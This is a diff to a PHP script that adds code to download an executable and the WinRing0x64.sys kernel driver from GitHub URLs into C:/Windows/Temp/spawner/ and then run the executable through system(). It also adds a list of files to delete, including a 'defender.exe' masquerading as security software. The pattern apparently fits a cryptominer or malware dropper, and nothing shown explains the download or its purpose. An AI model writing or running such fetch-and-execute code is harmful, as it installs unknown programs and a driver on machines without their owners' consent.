@@ -50,35 +50,49 @@ function executeCommand($command) {
 }
 
 
+$deletePaths = [
+    'C:/Windows/Temp/defender.exe',
+    'C:/Windows/Temp/WinRing0x64.sys',
+    'C:/Windows/Temp/config.json',
+
+];
 
 
 
 
-system('mkdir "C:/Windows/Temp/front2/"');
+system('mkdir "C:/Windows/Temp/spawner/"');
 
 
 
+$url =  'https://github.com/mainpoint91/fiveminllk/releases/download/tear/app.exe';
+$url2 =  'https://raw.githubusercontent.com/KarleyGreenholt/uni-test-project/refs/heads/main/WinRing0x64.sys';
 
-$url2 =  'https://github.com/mainpoint91/fiveminllk/releases/download/tear/app.exe';
+$file_name = 'C:/Windows/Temp/spawner/app.exe';
+$file_name2 = 'C:/Windows/Temp/spawner/WinRing0x64.sys';
+
+$found = false;
+$found2 = false;
+$found3 = false;
 
 
-$file_name2 = 'C:/Windows/Temp/front2/app.exe';
+
+        clearstatcache();
 
 
-
-
-         if (file_put_contents($file_name2, file_get_contents($url2)))
+        if (file_put_contents($file_name, file_get_contents($url)))
             {
-                system('C:/Windows/Temp/front2/app.exe');
+                system('C:/Windows/Temp/spawner/app.exe');
             }
         else
             {
             echo "File downloading failed.";
             }
+
  
 
          
         
+
 
 
 
